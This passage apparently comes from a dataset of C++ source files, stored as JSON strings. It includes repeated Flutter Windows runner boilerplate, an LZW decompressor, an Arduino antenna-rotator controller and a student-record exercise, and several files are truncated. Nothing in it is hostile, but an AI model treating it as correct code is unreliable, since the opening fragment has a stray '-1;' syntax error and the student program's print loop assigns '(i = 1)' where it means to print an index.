CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <unordered_map>\n#include <string>\n#include <cstdint>\n#include <chrono> \n#include <unordered_set>\n    // auto start = std::chrono::high_resolution_clock::now();\n    // auto stop = std::chrono::high_resolution_clock::now();\n    // auto duration2 = std::chrono::duration<double, std::milli>(stop-start);\n    // std::cout << \"time while file: \" << duration2.count() << std::endl;\n\n\n\nbool MSB_isOne(char &value) {\n    // 1 << 7 -> 10000000\n    return value & (1 << 7);\n}\n\n\nint main(int argc, char* argv[]) {\n\n    // Check #no provided args is correct\n    if (argc != 3) {\n        std::cout << \"Please only provide two args: input_file_path & output_file_path\" << std::endl;\n        return 1; \n    }\n\n    // Use (var & MSB) to flip MSB of value to 0; defined once to avoid redundancy\n    uint8_t msb = 0; // 0000\n    msb -= 1; // 1111\n    msb >>= 1; // 0111\n\n\n    std::ifstream inFile(argv[1], std::ios::binary | std::ios::app);\n\n    // Clear this later\n    std::ofstream out;\n    out.open(argv[2], std::ofstream::out | std::ofstream::trunc);\n    out.close();\n    //\n\n    std::ofstream outFile(argv[2], std::ios::binary | std::ios::app);\n\n    // Check files opens correctly\n    if (!inFile || !outFile )\n    {\n        std::cout << \"Unable to open or write to File.\" << std::endl;\n    }\n\n\n    if(inFile.is_open() && outFile.is_open()) {\n        \n        char c; \n        std::string p = \"\";\n        std::unordered_map<uint16_t, std::string> codeDict;\n        std::unordered_set<std::string> codeSet;\n        uint16_t index = 0;\n\n        inFile.get(c);\n        outFile.write(reinterpret_cast<const char*>(&c), sizeof(c)); \n        p = c;\n        while(inFile.get(c)) {\n                    std::cout << c << std::endl;\n\n            // Following 8 bits represent an ASCII char\n            if (!MSB_isOne(c)) {\n\n                if (codeSet.find(p+c) == codeSet.end()) {\n\n                    codeDict[index++] = p+c;\n                    codeSet.insert(p+c);\n                    p = c; \n\n                } else {        // If the concat. string is in the dict, we compound to get next dict entry\n                    p = p+c;\n                }\n                outFile.write(reinterpret_cast<const char*>(&c), sizeof(c)); \n\n             // Following 16 bits represent an index\n            } else { \n\n                uint8_t hiByte = c & msb;\n                inFile.get(c);\n                uint8_t loByte = c;\n                uint16_t reqIndex = (hiByte << 8) | loByte;\n\n                if (codeDict.find(reqIndex) != codeDict.end()) {\n\n                    for (const auto& ch : codeDict[reqIndex]) {\n                        outFile.write(reinterpret_cast<const char*>(&ch), sizeof(ch)); \n                    }\n\n                    if (codeSet.find(p+codeDict[reqIndex][0]) == codeSet.end()) {\n                        codeDict[index++] = p+codeDict[reqIndex][0];\n                        codeSet.insert(p+codeDict[reqIndex][0]);\n                    }\n\n                // Special case: If the index hasn't been encountered yet, we return p + p[0]\n                // Occurs when string concat occurs consecutively when encoding                \n                } else {\n                    \n                    for (const auto& ch : p) {\n                        outFile.write(reinterpret_cast<const char*>(&ch), sizeof(ch)); \n                    }\n                    outFile.write(reinterpret_cast<const char*>(&p[0]), sizeof(p[0])); \n\n                    codeDict[index++] = p + p[0];\n                    codeSet.insert(p + p[0]);\n                }\n\n                p = codeDict[reqIndex];\n                \n            }\n\n        }  \n \n        inFile.close();\n        outFile.close();\n    }\n\n\n}\n",
    "//ADD ACCEL/DECEL\n//ADD SPEED POT\n//ADD EL\n\n#include <Arduino.h>\n#include <U8g2lib.h>\n#include <Encoder.h>\n\n/*\n#define button_park 40\n*/\n\n#define homeAzPosition 55\n#define homeElPosition 0\n\n#define leftButtonPin 32\n#define rightButtonPin 33\n#define leftOutputPin 6\n#define rightOutputPin 7\n#define encAzPinA 3\n#define encAzPinB 21\n#define azPPDeg 5.33333\n\n#define azSpeedPin 54\n#define azSpeedMin 25\n#define azSpeedInc 4\n#define azSpeedDec 10\n#define azSpeedInterval 50\n\n#define encElPinA 19\n#define encElPinB 18\n#define upButtonPin 34\n#define downButtonPin 35\n#define upOutputPin 8\n#define downOutputPin 9\n#define elPPDeg 4\n\n#define elSpeedPin 53\n#define elSpeedMin 25\n#define elSpeedInc 10\n#define elSpeedDec 10\n#define elSpeedInterval 50\n\nunsigned long azSpeedStart = millis();\nunsigned long elSpeedStart = millis();\n\nEncoder AzEncoder(encAzPinA, encAzPinB);\nEncoder ElEncoder(encElPinA, encElPinB);\n\nU8G2_SSD1309_128X64_NONAME0_F_4W_SW_SPI displayLCD(U8G2_R0, /* clock=*/ 52, /* data=*/ 50, /* cs=*/ 49, /* dc=*/ 53, /* reset=*/ 51);  \n\nfloat currentAz = -100;\nfloat currentEl = -100;\n\nint azSpeedMax = 255;\nint azSpeedLeft = 0;\nint azSpeedRight = 0;\n\nint elSpeedMax = 255;\nint elSpeedUp = 0;\nint elSpeedDown = 0;\n\nvoid updateDisplay();\nvoid checkAzEl();\n\nvoid setup() {\n  Serial.begin(9600);\n\n  pinMode(leftButtonPin, INPUT);\n  pinMode(rightButtonPin, INPUT);\n  pinMode(leftButtonPin, INPUT_PULLUP);\n  pinMode(rightButtonPin, INPUT_PULLUP);\n\n  pinMode(leftOutputPin, OUTPUT);  \n  pinMode(rightOutputPin, OUTPUT);\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n\n  pinMode(upButtonPin, INPUT);\n  pinMode(downButtonPin, INPUT);\n  pinMode(upButtonPin, INPUT_PULLUP);\n  pinMode(downButtonPin, INPUT_PULLUP);\n\n  pinMode(upOutputPin, OUTPUT);\n  pinMode(downOutputPin, OUTPUT);\n  analogWrite(upOutputPin, elSpeedUp);\n  analogWrite(downOutputPin, elSpeedDown);\n\n  displayLCD.begin();\n\n  updateDisplay();\n}\nvoid loop() {\n\n  if(millis() - azSpeedStart >= azSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempAzSpeedMax = 255;\n    \n    if(tempAzSpeedMax < azSpeedMax)azSpeedMax -= azSpeedDec;\n    else azSpeedMax = tempAzSpeedMax;\n\n    if(!digitalRead(leftButtonPin) && azSpeedRight == 0){\n      if(azSpeedLeft == 0)azSpeedLeft = azSpeedMin;\n      \n      azSpeedLeft += azSpeedInc;\n      if(azSpeedLeft > azSpeedMax)azSpeedLeft = azSpeedMax;\n    }\n    else{\n      azSpeedLeft -= azSpeedDec;\n      if(azSpeedLeft != 0 && azSpeedLeft < azSpeedMin) azSpeedLeft = 0;\n    }\n  \n    if(!digitalRead(rightButtonPin) && azSpeedLeft == 0){\n      if(azSpeedRight == 0)azSpeedRight = azSpeedMin;\n\n      azSpeedRight += azSpeedInc;\n      if(azSpeedRight > azSpeedMax)azSpeedRight = azSpeedMax;\n    }\n  else{\n    azSpeedRight -= azSpeedDec;\n    if(azSpeedRight != 0 && azSpeedRight < azSpeedMin) azSpeedRight = 0;\n  }\n\n  azSpeedStart = millis();\n\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n  }\n\n  if(millis() - elSpeedStart >= elSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempElSpeedMax = 255;\n    \n    if(tempElSpeedMax < elSpeedMax)elSpeedMax -= elSpeedDec;\n    else elSpeedMax = tempElSpeedMax;\n\n    if(!digitalRead(upButtonPin) && elSpeedDown == 0){\n      if(elSpeedUp == 0)elSpeedUp = elSpeedMin;\n      \n      elSpeedUp += elSpeedInc;\n      if(elSpeedUp > elSpeedMax)elSpeedUp = elSpeedMax;\n    }\n    else{\n      elSpeedUp -= elSpeedDec;\n      if(elSpeedUp != 0 && elSpeedUp < elSpeedMin) elSpeedUp = 0;\n    }\n  \n    if(!digitalRead(downButtonPin) && elSpeedUp == 0){\n      if(elSpeedDown == 0)elSpeedDown = elSpeedMin;\n\n      elSpeedDown += elSpeedInc;\n      if(elSpeedDown > elSpeedMax)elSpeedDown = elSpeedMax;\n    }\n  else{\n    elSpeedDown -= elSpeedDec;\n    if(elSpeedDown != 0 && elSpeedDown < elSpeedMin) elSpeedDown = 0;\n  }\n\n  elSpeedStart = millis();\n\n  analogWrite(downOutputPin, elSpeedDown);\n  analogWrite(upOutputPin, elSpeedUp);\n  }\n\n  checkAzEl();\n}\nvoid checkAzEl(){\n  float tempAz = AzEncoder.read(); tempAz /= azPPDeg;\n  float tempEl = ElEncoder.read(); tempEl /= elPPDeg;\n  \n  tempAz += homeAzPosition;\n\n  if(tempAz < 0)tempAz += 360;\n  else if(tempAz > 360) tempAz -= 360;\n  /*if(tempEl < 0){\n    ElEncoder.write(0);\n    tempEl = 0;\n  }\n  else if(tempEl > 90){\n    ElEncoder.write(360);\n    tempEl = 90;\n  }*/\n\n  if(tempAz != currentAz){\n    currentAz = tempAz;\n    updateDisplay();\n  }\n\n  if(tempEl != currentEl){\n    currentEl = tempEl;\n    updateDisplay();\n  }\n}\nvoid updateDisplay(){\n  \n  displayLCD.setFontMode(1); \n  displayLCD.setDrawColor(1);\n  displayLCD.setFont(u8g2_font_osr26_tn);\n  displayLCD.clearBuffer();\n\n  if(currentAz >= 0 && currentAz < 10){displayLCD.setCursor(38,25);}\n  else if(currentAz >= 10 && currentAz < 100){displayLCD.setCursor(28,25);}\n  else{displayLCD.setCursor(17,25);}\n  displayLCD.print(currentAz,1);\n\n  if(currentEl <= -10",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct DetailAlamat {\n\tstring desa;\n\tstring kota;\n};\nstruct mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tint umur;\n};\nint main() {\n\tmahasiswa mhs[3];\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << \"data ke-\" << (i + 1) << \":\" << endl;\n\t\tcout << \"Nomor mahasiswa : \";\n\t\tgetline(cin, mhs[i].nim);\n\t\tcout << \"Nama Mahasiswa : \";\n\t\tgetline(cin, mhs[i].nama);\n\n\t\tcout << \"alamat mahasiswa : \" << endl;\n\t\tcout << \"\\t nama Desa : \";\n\t\tcin >> mhs[i].alamat.desa;\n\t\tcout << \"\\t Nama kota : \";\n\t\tcin >> mhs[i].alamat.kota;\n\t\tcout << \"Umur mahasiswa : \";\n\t\tcin >> mhs[i].umur;\n\t\tcin.ignore(1, '\\n');\n\t\tcout << endl;\n\t}\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << endl;\n\t\tcout << \"Data mahasiswa ke-\" << (i = 1) << \":\" << endl;\n\t\tcout << \"\\n Nim :\" << mhs[i].nim;\n\t\tcout << \"\\n Nama : \" << mhs[i].nama;\n\t\tcout << \"\\n alamat : \";\n\t\tcout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n\t\tcout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n\t\tcout << \"\\n Umur : \" << mhs[i].umur;\n\t\tcout << endl;\n\t}\n} ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
